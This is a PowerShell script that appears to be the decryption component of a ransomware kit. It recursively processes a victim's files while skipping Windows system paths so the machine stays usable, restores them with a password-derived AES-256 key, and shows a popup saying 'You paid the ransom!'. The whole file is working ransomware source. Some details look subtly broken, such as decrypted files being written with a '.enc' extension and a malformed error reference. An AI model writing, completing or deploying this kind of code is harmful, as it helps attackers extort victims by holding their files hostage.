param(
    [Parameter(Mandatory = $true)]
    [string]$FilesToDecrypt,
    
    [Parameter(Mandatory = $true)]
    [string]$Storage,

    [Parameter(Mandatory = $true)]
    [string]$Password
) 

#exclude critical and useless files from being encrypting so program can run smoothly 
$ExcludePattern = "^C:\\Windows|^C:\\Program Files|^C:\\Program Files \(x86\)|^C:\\$Recycle.Bin|^C:\\System Volume Information|^C:\\Config.Msi|^C:\\MSOCache|^C:\\hiberfil.sys|^C:\\pagefile.sys|^C:\\swapfile.sys"

#Constants for encryption creation
$Algorithm = "AES"
$KeySize   = 256
$BlockSize = 128
$Mode      = "CBC"
$Padding   = "PKCS7"

# Use Get-ChildItem and filter out system paths before processing
Get-ChildItem -Path $FilestoDecrypt -File -Recurse -Force -ErrorAction SilentlyContinue | 
    Where-Object { $_.FullName -notmatch $ExcludePattern } | 
    ForEach-Object {
        # Calculate new path, preserving folder structure in the output folder 
        $relativePath = $_.FullName.Substring($FilestoDecrypt.Length)
        $newFilePath   = Join-Path -Path $Storage -ChildPath ($relativePath + ".enc")
        
        # Call the existing function Unprotect-AesFile on each object 
        try {
            Write-Host "Decrypting: $($_.FullName)"

	    # Read encrypted file and break up salt, IV, and ct
	    $Bytes = [System.IO.File]::ReadAllBytes($_.FullName)
	    $Salt = $Bytes[0..15]
	    $IV   = $Bytes[16..31]
	    $CipherText = $Bytes[32..($Bytes.Length - 1)]

	    # Derive Key
	    $Derive = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $Salt, 100000)
	    $Key = $Derive.GetBytes($KeySize / 8)

	    #Create Decryptor ---
	    $AES = [System.Security.Cryptography.Aes]::Create()
	    $AES.KeySize  = $KeySize
	    $AES.BlockSize = $BlockSize
	    $AES.Mode = $Mode
	    $AES.Padding = $Padding
	    $AES.Key = $Key
	    $AES.IV  = $IV

	    $Decryptor = $AES.CreateDecryptor()

	    #Decrypt
	    $PlainText = $Decryptor.TransformFinalBlock($CipherText, 0, $CipherText.Length)

	    [System.IO.File]::WriteAllBytes($newFilePath, $PlainText)

            [IO.File]::WriteAllBytes($_.FullName, [IO.File]::ReadAllBytes($newFilePath))
        }
        catch {
            Write-Warning "Unable to decrypt: $($_.FullName). Receiving error: $($_.Message)"
        }
}
$wshell = New-Object -ComObject Wscript.Shell
$result = $wshell.popup("You paid the ransom! Your files are back to normal", 0)